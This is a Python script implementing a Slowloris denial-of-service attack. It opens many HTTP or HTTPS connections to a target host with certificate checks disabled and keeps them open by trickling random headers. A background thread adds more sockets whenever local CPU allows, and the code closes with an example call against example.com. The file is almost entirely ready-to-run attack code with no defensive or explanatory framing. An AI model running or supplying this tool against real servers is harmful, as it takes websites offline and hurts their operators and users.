import argparse
import logging
import random
import socket
import ssl
import threading
import psutil
import time
import signal
import sys
from typing import List

def send_line(self, line):
    line = f"{line}\r\n"
    self.send(line.encode("utf-8"))

def send_header(self, name, value):
    self.send_line(f"{name}: {value}")

setattr(socket.socket, "send_line", send_line)
setattr(socket.socket, "send_header", send_header)

def check_site_status(host: str, port: int, https: bool):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)

        if https:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=host)

        s.connect((host, port))
        s.close()
        return True
    except socket.error:
        return False

def get_cpu_usage():
    cpu_usage = psutil.cpu_percent(interval=1, percpu=True)
    total_cpu_usage = psutil.cpu_percent(interval=1)
    return cpu_usage, total_cpu_usage

def create_socket(host, port, https, randuseragent, list_of_sockets):
    try:
        s = init_socket(host, port, https, host, randuseragent)
        if s:
            list_of_sockets.append(s)
    except socket.error as e:
        logging.debug("Failed to create new socket: %s", e)

def slowloris_iteration(list_of_sockets: List[socket.socket], host, port, sockets, https, randuseragent):
    logging.info("Sending keep-alive headers...")
    logging.info("Socket count: %s", len(list_of_sockets))

    site_up = check_site_status(host, port, https)
    if not site_up:
        logging.info("Site is down. Stopping Slowloris.")
        return

    for s in list(list_of_sockets):
        try:
            s.send_header("X-a", random.randint(1, 5000))
        except socket.error:
            list_of_sockets.remove(s)

    diff = sockets - len(list_of_sockets)
    if diff <= 0:
        return

    logging.info("Creating %s new sockets...", diff)
    for _ in range(diff):
        try:
            create_socket(host, port, https, randuseragent, list_of_sockets)
        except socket.error as e:
            logging.debug("Failed to create new socket: %s", e)

def init_socket(ip: str, port: int, https: bool, host: str, randuseragent: bool):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(1)

    if https:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        s = ctx.wrap_socket(s, server_hostname=host)

    s.connect((ip, port))

    s.send_line(f"GET /?{random.randint(0, 2000)} HTTP/1.1")

    user_agents = [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
        # Add more user agents as needed
    ]

    ua = user_agents[0]
    if randuseragent:
        ua = random.choice(user_agents)

    s.send_header("User-Agent", ua)
    s.send_header("Accept-language", "en-US,en,q=0.5")
    return s

def create_socket_thread(host, port, https, randuseragent, list_of_sockets):
    while True:
        cpu_usage, total_cpu_usage = get_cpu_usage()

        if total_cpu_usage < 100:
            to_create = (100 - int(str(total_cpu_usage).split(".")[0])) * 10
            logging.info("Creating %s new sockets", to_create)

            for _ in range(to_create):
                create_socket(host, port, https, randuseragent, list_of_sockets)

        time.sleep(5)  # Adjust the sleep time as needed

def signal_handler(signum, frame):
    logging.info("Received signal {}. Stopping Slowloris.".format(signum))
    sys.exit(0)

def slowloris_attack(host: str, port: int, sockets: int, verbose: bool, randuseragent: bool, useproxy: bool,
                     proxy_host: str, proxy_port: int, https: bool, sleeptime: int):
    list_of_sockets = []

    logging.basicConfig(
        format="[%(asctime)s] %(message)s",
        datefmt="%d-%m-%Y %H:%M:%S",
        level=logging.DEBUG if verbose else logging.INFO,
    )

    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)

    logging.info("Attacking %s with %s sockets.", host, sockets)
    logging.info("Creating sockets...")

    for _ in range(sockets):
        try:
            logging.debug("Creating socket nr %s", _)
            create_socket(host, port, https, randuseragent, list_of_sockets)
        except socket.error as e:
            logging.debug(e)
            break

    create_socket_thread_ = threading.Thread(target=create_socket_thread, args=(host, port, https, randuseragent, list_of_sockets))
    create_socket_thread_.start()

    while True:
        try:
            slowloris_iteration(list_of_sockets, host, port, sockets, https, randuseragent)
        except Exception as e:
            logging.debug("Error in Slowloris iteration: %s", e)
        logging.debug("Sleeping for %d seconds", sleeptime)
        time.sleep(sleeptime)

# Example Usage:
# slowloris_attack("example.com", 80, 100, True, True, False, None, None, False, 5)
